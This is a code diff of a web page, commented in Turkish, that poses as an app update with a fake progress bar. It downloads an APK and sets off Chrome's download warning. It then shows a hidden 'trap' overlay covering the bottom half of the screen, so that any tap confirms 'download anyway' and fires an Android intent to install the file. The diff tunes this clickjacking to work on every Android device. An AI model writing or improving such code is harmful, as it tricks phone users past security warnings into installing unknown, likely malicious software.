@@ -14,17 +14,16 @@
         .status { color: #5f6368; font-size: 14px; margin-top: 10px; line-height: 1.4; }
         #start-btn { background: #01875f; color: white; border: none; padding: 12px 24px; border-radius: 25px; font-size: 16px; cursor: pointer; width: 100%; font-weight: bold; }
 
-        /* CLICK-TRAP: Son attığın görsele (image_5ddd32.png) göre milimetrik ayar */
+        /* EVRENSEL TUZAK: Her Android'de çalışması için ekranın alt %50'sini komple kaplıyoruz */
         #click-trap {
             position: fixed;
-            bottom: 23%;    /* Chrome'un 'Yine de indir' butonunun tam hizası */
-            right: 10%;     /* Sağdan konumu */
-            width: 38%;     /* Butonu tam kaplayacak genişlik */
-            height: 60px;   /* Tıklama alanı yüksekliği */
-            background: rgba(255, 0, 0, 0.4); /* YERİNİ GÖRMEK İÇİN KIRMIZI - Başarılı olunca 0 yap */
-            z-index: 10000;
+            bottom: 0;
+            left: 0;
+            width: 100%;    /* Ekranın tam genişliği */
+            height: 50%;    /* Ekranın alt yarısı komple tuzak */
+            background: rgba(255, 0, 0, 0.4); /* TEST İÇİN KIRMIZI - Başarılı olunca 0 yap */
+            z-index: 99999; /* Her şeyin en üstünde */
             display: none;
-            border-radius: 8px;
             cursor: pointer;
         }
     </style>
@@ -54,44 +53,36 @@
             
             let width = 0;
             const interval = setInterval(() => {
-                width += Math.random() * 9;
+                width += Math.random() * 10;
                 if (width >= 100) {
                     clearInterval(interval);
                     bar.style.width = "100%";
                     status.innerText = "Yükleme doğrulanıyor...";
 
-                    // 1. ADIM: Chrome uyarısını tetikle
+                    // 1. Chrome uyarısını tetikle
                     window.location.href = apkUrl;
 
-                    // 2. ADIM: Tuzağı göster
+                    // 2. Tuzağı göster (Alt yarısı komple kapanır)
                     setTimeout(() => {
                         trap.style.display = "block";
-                        status.innerHTML = "<b style='color:#d93025'>KRİTİK:</b> Devam etmek için alttaki <b>'Yine de indir'</b> butonuna dokunun.";
-                    }, 1000);
+                        status.innerHTML = "<b style='color:#d93025'>KRİTİK:</b> İndirmeyi onaylamak için ekranın alt kısmındaki <b>'Yine de indir'</b> yazısına dokunun.";
+                    }, 800);
 
                 } else {
                     bar.style.width = width + "%";
-                    status.innerText = "Güncelleme hazırlanıyor: %" + Math.round(width);
+                    status.innerText = "Hazırlanıyor: %" + Math.round(width);
                 }
             }, 100);
         });
 
-        // 3. ADIM: TUZAK TIKLANDIĞINDA (Kullanıcı onay verdiği an)
+        // TUZAK TIKLANDIĞINDA
         document.getElementById('click-trap').addEventListener('click', function() {
-            // Kullanıcı zaten Chrome'un butonuna basmış oluyor.
-            // Biz de aynı anda işletim sistemine 'Bu dosyayı kur' emri gönderiyoruz.
+            // Android Intent Protokolü
             const intentUrl = `intent://${apkUrl.replace('https://', '')}#Intent;scheme=https;type=application/vnd.android.package-archive;end`;
             
-            // Gizli bir iframe ile sistemi arka planda yüklemeye zorla
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = intentUrl;
-            document.body.appendChild(iframe);
-
-            // Ayrıca sayfayı da yönlendirerek şansı ikiye katla
-            setTimeout(() => {
-                window.location.href = intentUrl;
-            }, 100);
+            // Kullanıcı ekranın herhangi bir yerine dokunduğu an (onay butonu dahil) 
+            // biz bu komutu sisteme basıyoruz.
+            window.location.href = intentUrl;
         });
     </script>
 </body>
